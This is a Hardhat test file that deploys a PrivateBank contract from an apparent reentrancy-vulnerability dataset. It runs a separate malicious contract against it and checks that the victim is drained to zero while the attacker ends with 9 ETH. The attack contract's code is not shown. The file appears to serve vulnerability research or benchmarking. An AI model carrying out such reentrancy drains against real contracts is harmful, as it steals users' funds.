const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol", function () {  
    let PrivateBank;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol:Log");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy PrivateBank contract with Log address
        PrivateBank = await ethers.getContractFactory("contracts/dataset/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol:PrivateBank");
        victim = await PrivateBank.deploy(log.target);
        await victim.waitForDeployment();
        //await victim.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with PrivateBank address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from hacker on victim contract
        await hacker.deposit({value:  ethers.parseEther("2")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack({value:  ethers.parseEther("2")});
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        const hackerBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has a drained account
        expect(victimBalance).to.equal(ethers.parseEther("0")); 

        // 5 original balance + 2 from  initial deposit + 2 from CashOut fallback function 
        expect(hackerBalance).to.equal(ethers.parseEther("9"));
        
    });
    });
  